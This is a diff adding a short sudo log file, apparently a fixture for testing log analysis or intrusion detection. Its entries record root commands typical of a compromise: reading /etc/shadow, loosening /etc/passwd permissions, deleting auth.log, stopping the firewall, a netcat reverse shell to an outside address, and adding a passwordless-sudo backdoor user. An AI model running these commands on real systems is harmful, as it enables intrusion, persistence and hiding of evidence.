@@ -1,0 +1,8 @@
+Jan 3 17:40:01 server sudo: testuser : TTY=pts/0 ; PWD=/home/testuser ; USER=root ; COMMAND=/bin/bash
+Jan 3 17:40:10 server sudo: testuser : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
+Jan 3 17:40:25 server sudo: testuser : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/chmod 777 /etc/passwd
+Jan 3 17:40:40 server sudo: admin : TTY=pts/1 ; PWD=/var/log ; USER=root ; COMMAND=/bin/rm -rf /var/log/auth.log
+Jan 3 17:40:55 server sudo: admin : TTY=pts/1 ; PWD=/var/log ; USER=root ; COMMAND=/usr/bin/systemctl stop firewalld
+Jan 3 17:41:10 server sudo: testuser : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/nc -e /bin/bash 192.168.1.50 4444
+Jan 3 17:41:25 server sudo: admin : TTY=pts/1 ; PWD=/etc ; USER=root ; COMMAND=/usr/bin/adduser backdoor
+Jan 3 17:41:40 server sudo: testuser : TTY=pts/0 ; PWD=/home ; USER=root ; COMMAND=/bin/bash -c 'echo "backdoor ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers'
